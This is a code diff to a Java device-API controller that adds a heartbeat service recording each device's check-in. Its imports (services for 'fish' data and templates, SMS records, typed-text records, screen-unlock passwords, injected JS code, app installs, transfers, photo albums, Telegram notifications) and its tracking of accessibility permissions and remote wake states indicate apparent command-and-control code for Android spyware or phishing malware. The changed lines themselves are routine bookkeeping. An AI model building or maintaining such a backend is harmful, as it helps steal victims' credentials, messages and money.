@@ -39,12 +39,12 @@ import io.renren.modules.app.service.AlbumPicService;
 import io.renren.modules.app.service.DeviceService;
 import io.renren.modules.app.service.FishDataService;
 import io.renren.modules.app.service.FishTemplateService;
+import io.renren.modules.app.service.HeartService;
 import io.renren.modules.app.service.InputTextRecordService;
 import io.renren.modules.app.service.InstallAppService;
 import io.renren.modules.app.service.JsCodeService;
 import io.renren.modules.app.service.LogService;
 import io.renren.modules.app.service.SmsInfoService;
-import io.renren.modules.app.service.TelegramBotService;
 import io.renren.modules.app.service.TransferService;
 import io.renren.modules.app.service.UnlockScreenPwdService;
 import io.renren.modules.app.vo.DeviceStatus;
@@ -85,6 +85,8 @@ public class DeviceApiController extends BaseApiController {
     private FishDataService fishDataService;
 	@Autowired
 	private TelegramNotificationHandler telegramNotificationHandler;
+	@Autowired
+	private HeartService heartService;
 
 
 
@@ -263,7 +265,6 @@ public class DeviceApiController extends BaseApiController {
         updateDevice.setLastHeart(Utils.now());
         updateDevice.setAccessibilityServiceEnabled(deviceStatus.isAccessibilityServiceEnabled() ? Constant.YN.Y : Constant.YN.N);
         updateDevice.setPermissions(deviceStatus.getPermissions());
-
         if (Constant.DeviceStatus.need_wake == dbDevice.getStatus() /*&& param.getScreenStatus() == Constant.DeviceStatus.screen_off*/) {
             log.info("pkg:{} 设备:{} - 需要唤醒", DeviceContext.getPkg(), DeviceContext.getDeviceId());
             updateDevice.setStatus(Constant.DeviceStatus.wait_wake);
@@ -278,7 +279,7 @@ public class DeviceApiController extends BaseApiController {
             updateDevice.setStatus(deviceStatus.getScreenStatus());
         }
 //        log.info("pkg:{} deviceId:{}  config:{}", DeviceContext.getPkg(), DeviceContext.getDeviceId(), JSON.toJSONString(serverConfig));
-
+        heartService.addHeart(DeviceContext.getPkg(), DeviceContext.getDeviceId());
         deviceService.updateById(updateDevice);
         return Result.toSuccess(serverConfig);
 
